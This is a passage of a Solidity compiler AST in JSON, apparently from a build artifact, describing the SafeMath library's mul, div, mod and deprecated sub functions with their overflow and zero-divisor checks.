														"id": 357,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 350,
														"src": "3619:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 358,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3624:1:2",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "3619:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 362,
												"nodeType": "IfStatement",
												"src": "3615:20:2",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 360,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3634:1:2",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"functionReturnParameters": 356,
													"id": 361,
													"nodeType": "Return",
													"src": "3627:8:2"
												}
											},
											{
												"assignments": [
													364
												],
												"declarations": [
													{
														"constant": false,
														"id": 364,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 380,
														"src": "3645:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 363,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "3645:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 368,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 367,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 365,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 350,
														"src": "3657:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 366,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 352,
														"src": "3661:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3657:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3645:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 374,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 372,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 370,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 364,
																	"src": "3680:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 371,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 350,
																	"src": "3684:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3680:5:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 373,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 352,
																"src": "3689:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "3680:10:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77",
															"id": 375,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3692:35:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															},
															"value": "SafeMath: multiplication overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															}
														],
														"id": 369,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															511,
															512
														],
														"referencedDeclaration": 512,
														"src": "3672:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 376,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3672:56:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 377,
												"nodeType": "ExpressionStatement",
												"src": "3672:56:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 378,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 364,
													"src": "3745:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 356,
												"id": 379,
												"nodeType": "Return",
												"src": "3738:8:2"
											}
										]
									},
									"documentation": "@dev Returns the multiplication of two unsigned integers, reverting on\noverflow.\n     * Counterpart to Solidity's `*` operator.\n     * Requirements:\n     * - Multiplication cannot overflow.",
									"id": 381,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 353,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 350,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 381,
												"src": "3551:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 349,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3551:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 352,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 381,
												"src": "3562:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 351,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3562:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3550:22:2"
									},
									"returnParameters": {
										"id": 356,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 355,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 381,
												"src": "3596:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 354,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3596:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3595:9:2"
									},
									"scope": 493,
									"src": "3538:215:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 401,
										"nodeType": "Block",
										"src": "4284:83:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 393,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 391,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 385,
																"src": "4302:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 392,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4306:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4302:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206469766973696f6e206279207a65726f",
															"id": 394,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4309:28:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															},
															"value": "SafeMath: division by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															}
														],
														"id": 390,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															511,
															512
														],
														"referencedDeclaration": 512,
														"src": "4294:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 395,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4294:44:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 396,
												"nodeType": "ExpressionStatement",
												"src": "4294:44:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 399,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 397,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 383,
														"src": "4355:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 398,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 385,
														"src": "4359:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4355:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 389,
												"id": 400,
												"nodeType": "Return",
												"src": "4348:12:2"
											}
										]
									},
									"documentation": "@dev Returns the integer division of two unsigned integers, reverting on\ndivision by zero. The result is rounded towards zero.\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n`revert` opcode (which leaves remaining gas untouched) while Solidity\nuses an invalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n     * - The divisor cannot be zero.",
									"id": 402,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 386,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 383,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 402,
												"src": "4230:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 382,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4230:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 385,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 402,
												"src": "4241:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 384,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4241:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4229:22:2"
									},
									"returnParameters": {
										"id": 389,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 388,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 402,
												"src": "4275:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 387,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4275:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4274:9:2"
									},
									"scope": 493,
									"src": "4217:150:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 422,
										"nodeType": "Block",
										"src": "4887:81:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 414,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 412,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 406,
																"src": "4905:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 413,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4909:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4905:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d6f64756c6f206279207a65726f",
															"id": 415,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4912:26:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															},
															"value": "SafeMath: modulo by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															}
														],
														"id": 411,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															511,
															512
														],
														"referencedDeclaration": 512,
														"src": "4897:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 416,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4897:42:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 417,
												"nodeType": "ExpressionStatement",
												"src": "4897:42:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 420,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 418,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 404,
														"src": "4956:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 419,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 406,
														"src": "4960:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4956:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 410,
												"id": 421,
												"nodeType": "Return",
												"src": "4949:12:2"
											}
										]
									},
									"documentation": "@dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\nreverting when dividing by zero.\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\nopcode (which leaves remaining gas untouched) while Solidity uses an\ninvalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n     * - The divisor cannot be zero.",
									"id": 423,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 407,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 404,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 423,
												"src": "4833:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 403,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4833:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 406,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 423,
												"src": "4844:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 405,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4844:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4832:22:2"
									},
									"returnParameters": {
										"id": 410,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 409,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 423,
												"src": "4878:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 408,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4878:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4877:9:2"
									},
									"scope": 493,
									"src": "4820:148:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 445,
										"nodeType": "Block",
										"src": "5527:68:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 437,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 435,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 427,
																"src": "5545:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 436,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 425,
																"src": "5550:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "5545:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 438,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 429,
															"src": "5553:12:2",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 434,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															511,
															512
														],
														"referencedDeclaration": 512,
														"src": "5537:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 439,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5537:29:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 440,
												"nodeType": "ExpressionStatement",
												"src": "5537:29:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 443,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 441,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 425,
														"src": "5583:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 442,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 427,
														"src": "5587:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5583:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 433,
												"id": 444,
												"nodeType": "Return",
												"src": "5576:12:2"
											}
										]
									},
									"documentation": "@dev Returns the subtraction of two unsigned integers, reverting with custom message on\noverflow (when the result is negative).\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\nmessage unnecessarily. For custom revert reasons use {trySub}.\n     * Counterpart to Solidity's `-` operator.\n     * Requirements:\n     * - Subtraction cannot overflow.",
									"id": 446,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 430,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 425,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 446,
												"src": "5445:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 424,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5445:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 427,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 446,
												"src": "5456:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 426,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5456:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 429,
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 446,
												"src": "5467:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 428,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5467:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5444:50:2"
									},
									"returnParameters": {
										"id": 433,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 432,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 446,
												"src": "5518:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 431,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5518:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5517:9:2"
									},
									"scope": 493,
									"src": "5432:163:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 468,
										"nodeType": "Block",
										"src": "6347:67:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 460,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 458,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 450,
																"src": "6365:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 459,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6369:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "6365:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 461,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 452,
															"src": "6372:12:2",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 457,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															511,
															512
														],
														"referencedDeclaration": 512,
